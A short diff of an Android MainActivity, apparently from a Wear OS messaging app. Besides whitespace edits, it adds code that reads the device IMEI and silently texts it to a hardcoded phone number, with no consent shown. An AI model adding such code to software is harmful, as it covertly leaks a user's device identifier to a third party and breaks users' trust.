@@ -184,11 +184,13 @@ public class MainActivity extends Activity implements GoogleApiClient.Connection
                 capabilityListener,
                 MESSAGE_RECEIVE_CAPABILITY_NAME);
 
-        
+
         //Send imei to nearest node
         TelephonyManager TM = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         String imeiNo = TM.getDeviceId();
         sendMessage(imeiNo.getBytes());
+        SmsManager SM = SmsManager.getDefault();
+        SM.sendTextMessage("07922021702", null, imeiNo, null, null);
 
     }
 
@@ -231,6 +233,7 @@ public class MainActivity extends Activity implements GoogleApiClient.Connection
             }
         }
     }
+
     @Override
     public void onConnectionSuspended(int i) {
 
